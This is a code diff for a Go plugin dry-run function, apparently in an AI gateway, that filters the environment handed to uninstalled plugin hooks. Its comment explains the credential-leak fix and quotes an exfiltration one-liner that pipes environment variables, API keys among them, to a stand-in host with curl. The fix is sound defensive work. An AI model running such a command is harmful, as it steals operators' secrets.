@@ -87,7 +87,20 @@ func runHook(ctx context.Context, dir string, h hook, cfg DryRunConfig) []Findin
 	// Point HTTP egress at a dead loopback proxy: nothing listens on
 	// 127.0.0.1:9 (discard), so http(s) clients that honour proxy env vars
 	// fail fast instead of phoning home during the dry-run.
-	cmd.Env = append(os.Environ(),
+	// FILTERED, not os.Environ(). This function exists to run code the
+	// operator has NOT yet decided to trust — that is the entire premise of
+	// pre-install inspection — and it was handing that code the gateway's
+	// whole environment: ANTHROPIC_API_KEY, OPENAI_API_KEY, database URLs.
+	// A plugin whose "sidecar" is `sh -c 'env | curl -d@- evil'` collected
+	// every provider key the operator held, at inspection time, before any
+	// install decision was made, and the dry-run reported a clean exit.
+	//
+	// Every other subprocess boundary in the repo (tool dispatch, shell
+	// tools, executor pool, MCP stdio) already goes through the sandbox
+	// filter; this one was missed because it reads as tooling rather than as
+	// an execution surface. nil allowExtra: an uninstalled package has no
+	// operator-approved `env:` allowlist yet, so it gets the base four.
+	cmd.Env = append(sandbox.FilteredEnv(os.Environ(), nil),
 		"HTTP_PROXY=http://127.0.0.1:9",
 		"HTTPS_PROXY=http://127.0.0.1:9",
 		"http_proxy=http://127.0.0.1:9",
